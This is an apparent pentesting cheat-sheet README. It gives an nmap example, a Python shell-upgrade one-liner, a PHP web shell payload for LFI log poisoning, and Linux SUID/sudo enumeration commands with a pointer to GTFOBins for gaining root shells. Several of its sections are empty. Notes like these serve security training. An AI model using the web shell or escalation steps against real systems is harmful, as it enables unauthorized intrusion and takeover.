# usefulpentestinfo
Collection of scripts, tools, and other useful stuff I've found for pentesting.


## Miscellaneous Useful Stuff
`IP="xxx.xxx.xxx.xxx"` <- Target IP Here - A easy way to save yourself tons of typing the same IP addr over and over again.

Then whenever you run a command, you can just use `$IP` to use that saved IP Addr.

EXAMPLE: `nmap -A -T4 $IP`

## Upgrading Shells
`python -c 'import pty; pty.spawn("/bin/bash")'`
## Update Scripts
`apt-get update && apt-get upgrade && yum update`

## LFI Poisoning 

If the system is hosting a web-server, you can try 
`<?php system($_GET['c']); ?>`
## NMAP Scans

## SMB Enum

## Password Cracking

## Privilege Escalation - Linux
`sudo -l` - Lists files that the current user can run as root without password.

`find / -perm -g=s -o -perm -u=s -type f 2>/dev/null` - Seach for files with a SGID or SUID bit set

``for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done`` - Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other \*bin, for SGID or SUID (Quicker search)

If any of the above scripts find something, search the command/file on https://gtfobins.github.io/, you can usually go into a root shell, or read files that you don't have access to with this.
